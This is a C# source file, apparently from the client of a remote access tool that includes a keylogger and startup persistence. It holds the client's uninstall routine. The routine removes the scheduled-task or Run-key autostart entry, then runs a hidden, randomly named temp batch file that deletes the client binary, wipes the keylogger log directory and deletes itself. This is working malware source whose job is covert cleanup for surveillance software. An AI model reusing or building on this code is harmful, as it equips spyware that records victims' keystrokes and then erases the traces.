using Client.Controllers.Tools;
using Client.Models;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Client.Controllers
{
    public static class ClientUninstallerController
    {
        private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        private static readonly Random _rnd = new Random(Environment.TickCount);

        public static void uninstall(ClientMosaique client)
        {
            try
            {
                if (Boot.autoStartEnabled)
                {
                    RemoveFromStartup();
                }

                string batchFile = createUninstallBatch();

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Could not create uninstall-batch file");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };

                Process.Start(startInfo);

                Program.client.Exit();
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Uninstallation failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static string createUninstallBatch()
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string uninstallBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + ClientData.currentPath + "\"" + "\r\n" +
                    "rmdir /q /s " + "\"" + Keylogger.LogDirectory + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Creates an unused temp file path. 
        /// </summary>
        /// <param name="extension">The file extension with dot.</param>
        /// <returns>The path to the temp file.</returns>
        public static string GetTempFilePath(string extension)
        {
            while (true)
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
                if (File.Exists(tempFilePath)) continue;
                return tempFilePath;
            }
        }

        public static string GetRandomFilename(int length, string extension = "")
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(CHARS[_rnd.Next(CHARS.Length)]);

            return string.Concat(randomName.ToString(), extension);
        }

        public static bool RemoveFromStartup()
        {
            if (AuthenticationController.getAccountType() == "Admin")
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/delete /tn \"" + Boot.startupName + "\" /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return true;
                }
                catch (Exception)
                {
                }

                return StartupManagerController.deleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Boot.startupName);
            }
            else
            {
                return StartupManagerController.deleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Boot.startupName);
            }
        }
    }
}
